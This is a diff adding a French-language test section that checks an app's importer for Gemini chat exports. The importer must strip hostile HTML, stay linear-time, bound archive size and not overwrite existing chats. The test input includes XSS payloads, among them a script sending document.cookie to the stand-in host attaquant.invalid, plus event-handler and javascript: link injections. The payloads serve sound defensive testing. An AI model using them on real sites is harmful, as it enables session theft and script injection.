@@ -7997,6 +7997,89 @@ console.log("\n31. Windows et mise en route : moteur de LM Studio installé en e
   verifier("l'écran de mise en route propose seulement les modèles qui tiennent, et montre celui qui s'installe", /possibles: modelesQuiTiennent\(hardware\)/.test(readFileSync(join(RACINE, "gateway", "src", "index.ts"), "utf8")) && /const affiche = enCours \?\? choisi;/.test(ecran), "index.ts, FirstRun.tsx");
 }
 
+/*
+ * Import des Chats de Gemini (28/09/2026, src/lib/importGemini.ts). L'export
+ * de Google Takeout porte les réponses en HTML : il est lu sur le poste, dans
+ * la fenêtre de l'application. Ce qui est tenu ici : aucune balise ne passe
+ * (le vrai lecteur, empaqueté, sur du HTML piégé), aucun DOM ni HTML
+ * interprété, temps linéaire, taille bornée même quand l'archive ment, et
+ * aucun Chat existant écrit par-dessus. L'essai complet (formats, cas
+ * limites, double import) : scripts/essai-import-gemini.mjs.
+ */
+console.log("\n32. Import des Chats de Gemini : HTML de l'export jamais interprété, taille bornée, rien d'écrasé (28/09/2026)");
+{
+  const lecteur = readFileSync(join(RACINE, "src", "lib", "importGemini.ts"), "utf8");
+  const archive = readFileSync(join(RACINE, "src", "lib", "importChats.ts"), "utf8");
+  const ecran = readFileSync(join(RACINE, "src", "components", "settings", "ImporterChats.tsx"), "utf8");
+  const code = (s) => s.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
+  verifier(
+    "le lecteur Gemini n'utilise ni DOM ni HTML interprété (pas de DOMParser, innerHTML, createElement ni dangerouslySetInnerHTML)",
+    !/DOMParser|innerHTML|outerHTML|createElement|dangerouslySetInnerHTML|insertAdjacentHTML/.test(code(lecteur) + code(archive) + code(ecran)),
+    "importGemini.ts, importChats.ts, ImporterChats.tsx",
+  );
+  verifier("les balises sont parcourues par `parcourirBalises` (temps linéaire, texteBrut.ts)", /parcourirBalises\(/.test(lecteur) && /from "\.\.\/\.\.\/gateway\/src\/texteBrut\.ts"/.test(lecteur), "importGemini.ts");
+  verifier(
+    "une entrée d'archive Gemini est lue avec une limite : taille annoncée vérifiée, lecture arrêtée en cours de décompression",
+    /if \(e\.tailleNormale > max/.test(archive) && /if \(lus > max\) \{\s*await lecteur\.cancel\(\)/.test(archive) && /lireEntree\(fichier, e, GEMINI_FICHIER_MAX - total\)/.test(archive),
+    "importChats.ts",
+  );
+  verifier(
+    "un Chat déjà importé n'est ni réimporté ni écrasé : clé d'origine retenue, relue au moment d'importer, écriture par ajout seulement",
+    /importe: \{ source: donnees\.source, cle: c\.cle, messages: c\.messages\.length \}/.test(ecran) &&
+      /const dejaLa = chatsDejaImportes\(moi\.id, donnees\.source\);/.test(ecran) &&
+      /persist\(\[\.\.\.nouvelles\.filter\(\(s\) => !ids\.has\(s\.id\)\), \.\.\.avant\]\)/.test(readFileSync(join(RACINE, "src", "lib", "store", "sessions.ts"), "utf8")),
+    "ImporterChats.tsx, sessions.ts",
+  );
+
+  // Le vrai lecteur, empaqueté, sur du HTML piégé.
+  const { build } = await import("esbuild");
+  const { pathToFileURL: versUrl } = await import("node:url");
+  const dossierGemini = mkdtempSync(join(tmpdir(), "helix-gemini-"));
+  try {
+    await build({
+      entryPoints: [join(RACINE, "src", "lib", "importGemini.ts")],
+      bundle: true,
+      format: "esm",
+      platform: "browser",
+      outfile: join(dossierGemini, "gemini.mjs"),
+      alias: { "@": join(RACINE, "src") },
+      logLevel: "error",
+    });
+    const avantLs = globalThis.localStorage;
+    globalThis.localStorage ??= { getItem: () => "fr", setItem: () => undefined, removeItem: () => undefined };
+    const G = await import(versUrl(join(dossierGemini, "gemini.mjs")).href);
+    if (avantLs === undefined) delete globalThis.localStorage;
+    const piege =
+      '<p>Réponse</p><script>fetch("https://attaquant.invalid/?"+document.cookie)</script><style>*{display:none}</style>' +
+      '<img src=x onerror="alert(1)"><iframe src="https://attaquant.invalid/"></iframe><svg onload="alert(2)"><script>alert(3)</script></svg>' +
+      '<a href="javascript:alert(4)">lien</a> <a href=" JaVaScRiPt:alert(5)">autre</a> <a href="data:text/html,<script>alert(6)</script>">data</a>' +
+      '<a href="https://exemple.org/">site</a><scr<script>ipt>x</script><!-- <script>alert(7)</script> -->';
+    const sortie = G.texteDepuisHtml(piege);
+    const balise = /<\s*\/?\s*[a-z][a-z0-9]*(\s[^<>]*)?>/i;
+    verifier("réponse piégée : aucune balise dans le texte repris", !balise.test(sortie), sortie);
+    verifier("réponse piégée : scripts, styles, iframe, svg et commentaires retirés avec leur contenu", !/attaquant|display:none|alert\([1-37]\)|cookie/.test(sortie), sortie);
+    verifier("liens : `javascript:` et `data:` jamais gardés, une adresse web en texte", !/javascript|data:/i.test(sortie) && sortie.includes("site (https://exemple.org/)"), sortie);
+    const activites = G.activitesDepuisJson([
+      { header: "Gemini Apps", title: "Prompted <img src=x onerror=alert(1)>", time: "2026-07-18T08:00:00Z", products: ["Gemini Apps"], safeHtmlItem: [{ html: piege }], titleUrl: "https://gemini.google.com/app/abcdef123456" },
+      { header: "Search", title: "Searched for gemini", time: "2026-07-18T08:00:00Z", products: ["Search"] },
+    ]);
+    verifier("journal JSON : la Recherche écartée, la question Gemini reprise avec son lien de conversation", activites.activites.length === 1 && activites.activites[0].fil === "abcdef123456");
+    const t0 = Date.now();
+    G.texteDepuisHtml(`<p>${"<".repeat(300_000)}${"<a ".repeat(100_000)}</p>`);
+    verifier("300 000 `<` sans `>` puis 100 000 balises ouvertes : lus en moins de 2 s", Date.now() - t0 < 2000, `${Date.now() - t0} ms`);
+    const t1 = Date.now();
+    const lourd = G.activitesDepuisHtml(
+      `<div class="outer-cell">`.repeat(50_000) +
+        `<div class="outer-cell"><p class="mdl-typography--title">Gemini Apps<br></p><div class="content-cell mdl-cell--6-col mdl-typography--body-1">Prompted x${"<br>".repeat(100_000)}</div>`,
+    );
+    verifier("50 000 cartes vides, puis une question de 100 000 sauts de ligne : lues en moins de 3 s", Date.now() - t1 < 3000 && lourd.activites.length === 1, `${Date.now() - t1} ms`);
+  } catch (e) {
+    verifier("le lecteur Gemini s'empaquette et se charge", false, String(e?.message ?? e));
+  } finally {
+    rmSync(dossierGemini, { recursive: true, force: true });
+  }
+}
+
 console.log(`\n${reussis} vérification(s) réussie(s), ${echecs.length} échec(s).`);
 if (echecs.length) {
   console.log("Échecs :");
